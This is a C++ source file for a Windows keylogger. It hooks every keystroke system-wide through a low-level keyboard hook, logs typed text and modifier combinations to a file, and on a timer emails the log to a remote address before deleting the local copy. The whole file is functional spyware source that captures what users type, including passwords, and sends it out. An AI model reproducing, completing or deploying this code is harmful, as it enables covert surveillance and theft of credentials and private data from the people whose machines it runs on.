#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include "KeyConstants.h"
#include "Helper.h"
#include "Timer.h"
#include "IO.h"
#include "MailSender.h"
#include "KeyboardHook.h"
#include "Settings.h"

namespace KeyboardHook
{

    long secondInMilliseconds = 1000L; 
    long minuteInMilliseconds = secondInMilliseconds * 60;
    long hourInMilliseconds = minuteInMilliseconds * 60;
    
    Timer MailSendTimer(TimerSendMail, Settings::get_mail_interval() * hourInMilliseconds, Timer::Infinite);
    Timer LoggingTimer(TimedLog, minuteInMilliseconds, Timer::Infinite);
    HHOOK eHook = NULL;
    std::string keylogString = "";

    bool shiftPressed = false;
    bool crtlPressed = false;
    bool altPressed = false;

    int lastAppendageLenght = 0;

    void TimerSendMail()
    {

        
        if(keylogString.empty())
            return;

        IO::WriteToLog(keylogString);
        std::string lLogFP = IO::GetLastLogPath();
        if (!IO::GetLogWriteSuccess())
        {
            //IO::WriteDebugAppLog("Log file writing failed.\n Keylog: " + keylogString);
            return;
        }

        std::string dtString = Helper::DateTime().GetDateTimeString(".", " | ");

        int x = Mail::SendMail("LOG: " + dtString,
                                "This log was sent at " + dtString,
                                lLogFP,
                                true);

        if ( x != 7)
        {
            //IO::WriteDebugAppLog("Mail sending failed, script returned code: " + Helper::ToString(x));
        }
        else
        {
            keylogString = "";
            IO::DeleteFile(lLogFP);
        }
    }

    void TimedLog()
    {
        if (keylogString.empty())
            return;

        IO::WriteToLog(keylogString);
        std::string lLogFP = IO::GetLastLogPath();
        if (!IO::GetLogWriteSuccess())
        {
            //IO::WriteDebugAppLog("Log file writing failed.\n Keylog: " + keylogString);
            return;
        }
        else
        {
            keylogString = "";
        }
    }

    LRESULT MyKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode < 0)
            CallNextHookEx(eHook, nCode, wParam, lParam);

        KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lParam;
        ParseInput(wParam, kbs);

        return CallNextHookEx(eHook, nCode, wParam, lParam);
    }

    void ParseInput(WPARAM wParam, KBDLLHOOKSTRUCT *kbs)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            DWORD key = kbs->vkCode;
            
            switch (key)
            {
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                shiftPressed = true;
                break;
            
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                crtlPressed = true;
                break;

            case VK_MENU:
            case VK_LMENU:
            case VK_RMENU:
                altPressed = true;
                break;

            case VK_BACK:
                if (crtlPressed)
                    keylogString += "[Control + Backspace]";
                else if (!keylogString.empty())
                {
                    for (int i = 0; i < lastAppendageLenght; i ++)
                        keylogString.pop_back();
                }
                break;

            case VK_SPACE:
                keylogString += " ";
                break;
                
            default:
                KeyPair kp = Keys::KEYS.find(kbs->vkCode)->second;
                std::string keyToAddToString;
                if (crtlPressed && shiftPressed)
                    keyToAddToString = "[Control + Shift + " + kp.Name + "]";
                else if (altPressed && shiftPressed)
                    keyToAddToString = "[Alt + Shift + " + kp.Name + "]";
                else if (shiftPressed)
                    keyToAddToString = kp.ShiftName;
                else if (crtlPressed)
                    keyToAddToString = "[Control + " + kp.Name + "]";
                else if (altPressed)
                    keyToAddToString = "[Alt + " + kp.Name + "]";
                else
                    keyToAddToString = kp.Name;
                
                lastAppendageLenght = keyToAddToString.length();
                keylogString += keyToAddToString;

                if (key == VK_RETURN)
                    keylogString += "\n";
                break;
            }

        }
        
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        {
            DWORD key = kbs->vkCode;

            switch (key)
            {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    shiftPressed = false;
                    break;

                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                    crtlPressed = false;
                    break;
                    
                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                    altPressed = false;
                    break;

                default:
                    break;
            }
        }
    }

    void VerboseParseInput(WPARAM wParam , KBDLLHOOKSTRUCT *kbs)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            DWORD key = kbs->vkCode;
            switch (key)
            {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    shiftPressed = true;
                    break;

                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                    crtlPressed = true;
                    break;

                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                    altPressed = true;
                    break;
                    
                default:
                    break;
            }
            std::string keyToAddToString = Keys::KEYS.find(kbs->vkCode)->second.Name;
            keylogString += keyToAddToString;
            if (kbs->vkCode == VK_RETURN)
                keylogString += "\n";
        }
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        {
            DWORD key = kbs->vkCode;

            switch (key)
            {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    shiftPressed = false;
                    break;

                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:
                    crtlPressed = false;
                    break;

                case VK_MENU:
                case VK_LMENU:
                case VK_RMENU:
                    altPressed = false;
                    break;

                default:
                    break;
            }
            if (key == VK_CONTROL ||
                key == VK_LCONTROL ||
                key == VK_RCONTROL ||
                key == VK_SHIFT ||
                key == VK_LSHIFT ||
                key == VK_RSHIFT ||
                key == VK_MENU ||
                key == VK_LMENU ||
                key == VK_RMENU ||
                key == VK_CAPITAL ||
                key == VK_NUMLOCK ||
                key == VK_LWIN ||
                key == VK_RWIN)
            {
                std::string keyName = Keys::KEYS.find(kbs->vkCode)->second.Name;
                keyName.insert(1, "/"); // make [Shift] --> [/Shift]
                keylogString += keyName;
            }
        }
    }

    bool InstallHook()
    {
        //IO::WriteDebugAppLog("Starting hook and timer...");
        LoggingTimer.Start(true);
        MailSendTimer.Start(true);

        eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)MyKeyboardProc,
                                GetModuleHandle(NULL), 0);
        return eHook != NULL;
    }

    bool UninstallHook()
    {
        bool b = UnhookWindowsHookEx (eHook);
        LoggingTimer.Stop();
        MailSendTimer.Stop();
        eHook = NULL;
        return (bool)b;
    }

    bool IsHooked()
    {
        return eHook == NULL;
    }

} // NAMESPACE: